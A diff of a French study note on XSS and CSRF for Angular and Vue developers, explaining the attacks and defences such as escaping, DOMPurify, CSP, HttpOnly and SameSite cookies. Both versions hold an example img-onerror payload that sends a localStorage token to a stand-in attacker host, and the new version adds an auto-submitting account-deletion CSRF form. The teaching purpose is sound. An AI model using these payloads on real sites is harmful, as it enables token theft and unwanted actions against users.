@@ -1,6 +1,6 @@
 ---
 created: 2026-09-24
-modified: 2026-09-24
+modified: 2026-09-26
 type: knowledge
 status: "🔴 Not Started"
 level: Intermédiaire
@@ -10,141 +10,82 @@ tags:
 aliases:
   - "XSS et CSRF"
 parent: "[[Sécurité]]"
-children: []
 related_theory:
   - "[[SEC-02-OWASP-Top-10|Vulnérabilités OWASP Top 10]]"
   - "[[JS-08-DOM-Evenements|DOM et Événements JavaScript]]"
   - "[[JS-11-Stockage-Navigateur|Stockage Navigateur]]"
-related_snippets:
-  - "[[04_Snippets/sec-06-xss-csrf]]"
 related_projects: []
 source: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
 ---
 
 # XSS et CSRF
 
-> [!abstract] Introduction
-> XSS : un attaquant fait exécuter son JavaScript dans la page de ta victime. CSRF : un site malveillant fait envoyer une requête authentifiée à ton API à l'insu de l'utilisateur. Les deux failles front les plus importantes.
+> [!abstract] En bref
+> Deux attaques classiques contre les applications web. **XSS** : un attaquant fait exécuter **son script** dans la page de tes utilisateurs (par exemple via une critique contenant du code). **CSRF** : un site piégé fait envoyer une **requête à ton API** avec les cookies de l'utilisateur, à son insu. Angular et Vue te protègent beaucoup, à condition de ne pas contourner leurs protections.
 
-> [!warning]- Prérequis
-> [[SEC-01-Fondamentaux-Securite|Fondamentaux de la Sécurité]]
+## XSS (Cross-Site Scripting)
 
----
-
-## Théorie
-
-> [!question]- C'est quoi ?
-> **XSS** (Cross-Site Scripting) :
-> - Stockée : un commentaire contient `<img src=x onerror="fetch('//pirate?c='+localStorage.token)">`
-> - Réfléchie : le script vient de l'URL
-> - DOM-based : du JS insère des données non fiables dans le DOM
-> **CSRF** (Cross-Site Request Forgery) : `<form action="https://banque.fr/virement" method="POST">` auto-soumis depuis un autre site ; le navigateur joint automatiquement les cookies.
-
-> [!example]- Analogie
-> XSS : glisser une fausse instruction dans le manuel d'un employé qui l'exécutera sans se méfier. CSRF : imiter la signature du patron sur un bon de commande.
-
-> [!question]- Pourquoi l'utiliser ?
-> Une XSS permet de tout faire à la place de l'utilisateur (lire ses données, agir en son nom) ; une CSRF permet des actions non voulues (changer l'email, supprimer un compte).
-
-> [!question]- Comment ça marche ?
-> Protection XSS :
-> - Angular et Vue **échappent par défaut** les interpolations `{{ }}` ✅
-> - Dangers : `[innerHTML]` + `bypassSecurityTrustHtml`, `v-html`, `innerHTML` manuel, URLs `javascript:` → assainir (DOMPurify) ou éviter
-> - **CSP** (Content-Security-Policy) : interdire les scripts inline et domaines non autorisés
-> - Cookies `HttpOnly` pour que les tokens ne soient pas lisibles
-> Protection CSRF :
-> - Cookies `SameSite=Lax/Strict`
-> - Token anti-CSRF (Angular `HttpClient` gère le pattern XSRF-TOKEN automatiquement)
-> - API avec token en en-tête `Authorization` → pas de CSRF classique (mais attention XSS)
-
-> [!question]- Quand l'utiliser ?
-> À chaque affichage de contenu utilisateur (critiques, commentaires, profils) et à chaque action modifiante authentifiée par cookie.
-
-> [!danger]- Quand NE PAS l'utiliser / Limites
-> Une CSP stricte peut casser des librairies tierces ; la mettre en place progressivement (mode report-only).
-
----
-
-## Vocabulaire
-
-| Terme | Définition en une ligne |
-|-------|--------------------------|
-| XSS | Injection de script dans une page |
-| CSRF | Requête forgée depuis un autre site |
-| CSP | Politique qui restreint les sources de scripts |
-| Assainir (sanitize) | Retirer le contenu dangereux d'un HTML |
-| SameSite | Attribut limitant l'envoi cross-site des cookies |
-
----
-
-## Points clés
-
-- Interpolation framework = sûre par défaut
-- `v-html` / `innerHTML` = danger, assainir
-- CSP + HttpOnly = défense en profondeur
-- SameSite + token anti-CSRF pour les cookies
-
----
-
-## Pièges courants
-
-> [!bug]- Erreurs fréquentes
-> - `v-html="critique.texte"` pour afficher des retours à la ligne (utiliser CSS `white-space: pre-line`)
-> - `bypassSecurityTrustHtml` pour « faire marcher » un affichage
-
----
-
-## Exemple minimal
+Un utilisateur publie cette « critique » :
 
 ```html
-<!-- ❌ Vue -->
-<p v-html="critique.texte"></p>
-<!-- ✅ -->
-<p class="texte-critique">{{ critique.texte }}</p>
-<style>.texte-critique { white-space: pre-line; }</style>
+Super film ! <img src="x" onerror="fetch('https://pirate.fr?c=' + localStorage.token)">
 ```
 
-> [!note] Ce que j'en retiens
-> Le besoin (retours à la ligne) se règle en CSS, sans ouvrir de faille.
+Si ton site l'affiche comme du HTML, le script s'exécute **chez chaque visiteur** qui lit la critique, et envoie leur jeton à l'attaquant.
 
----
+### Comment tu es protégé
 
-## Pour aller plus loin (niveau senior)
+Angular et Vue **échappent** automatiquement ce que tu affiches : `{{ review.comment }}` affiche le texte tel quel, le `<img>` devient du texte inoffensif.
 
-> [!tip]- Ce qui distingue un dev expérimenté
-> - Déployer une CSP stricte avec nonces (Angular supporte `ngCspNonce`)
+**Les seuls moments où tu te mets en danger :**
 
----
+| Dangereux | À la place |
+|---|---|
+| `element.innerHTML = texte` | `element.textContent = texte` |
+| Vue : `v-html="review.comment"` | `{{ review.comment }}` |
+| Angular : `[innerHTML]` avec `bypassSecurityTrustHtml` | laisser Angular nettoyer, ou `{{ }}` |
+| construire du HTML en concaténant des textes | les templates du framework |
 
-## Connexions
+Si tu dois vraiment afficher du HTML (texte riche), nettoie-le avec **DOMPurify**.
 
-**Arbre théorique :**
-- Sujet parent → [[Sécurité]]
-- Sous-sujets → (aucun pour l'instant)
-- À comparer avec → (—)
+**Protections supplémentaires :** jeton de connexion hors de `localStorage` (cookie `HttpOnly`), et un en-tête **Content-Security-Policy** qui interdit les scripts venant d'ailleurs.
 
-**Pratique :**
-- Extrait de code → [[04_Snippets/sec-06-xss-csrf]]
+## CSRF (Cross-Site Request Forgery)
 
----
+L'utilisateur est connecté à ton site (cookie de session). Il visite un site piégé qui contient :
 
-## Auto-vérification
+```html
+<form action="https://api.cinetrack.fr/account/delete" method="POST" id="f"></form>
+<script>document.getElementById('f').submit()</script>
+```
 
-> [!check]- Est-ce que je maîtrise vraiment ?
-> - Pourquoi Angular et Vue sont-ils protégés contre la XSS par défaut, et quand cessent-ils de l'être ?
+Le navigateur envoie la requête **avec le cookie** de l'utilisateur : le compte est supprimé.
 
-> [!faq]- Questions d'entretien
-> - Expliquez XSS et CSRF et comment vous les prévenez.
+```mermaid
+sequenceDiagram
+  participant U as Navigateur de l'utilisateur
+  participant P as Site piégé
+  participant A as Ton API
+  U->>P: visite le site piégé
+  P-->>U: page avec un formulaire caché
+  U->>A: POST /account/delete + cookie de session (envoyé automatiquement !)
+  A-->>U: 200 😱
+```
 
----
+### Comment tu es protégé
 
-## Tâches
+| Protection | Effet |
+|---|---|
+| **`SameSite=Lax` ou `Strict`** sur les cookies | le cookie n'est pas envoyé depuis un autre site |
+| jeton dans l'en-tête `Authorization` (pas en cookie) | le site piégé ne peut pas l'ajouter |
+| jeton anti-CSRF | une valeur secrète que le site piégé ne connaît pas |
+| ne jamais modifier de données avec un `GET` | |
 
-- [ ] #task Tenter une XSS sur CinéTrack via une critique et vérifier qu'elle est neutralisée
-- [ ] #task Mettre à jour `status` une fois maîtrisé
+Avec un JWT envoyé dans `Authorization: Bearer`, le CSRF n'est pas possible sur ces routes. Il faut y penser pour les routes qui utilisent un cookie (le rafraîchissement du jeton) : `SameSite` suffit en général.
 
----
+## Résumé
 
-## Notes brutes
-
-- ?
+| | XSS | CSRF |
+|---|---|---|
+| L'attaquant… | exécute **son code** dans ta page | fait envoyer **une requête** en ton nom |
+| Protection principale | ne jamais afficher de HTML non nettoyé | cookies `SameSite`, jeton dans l'en-tête |
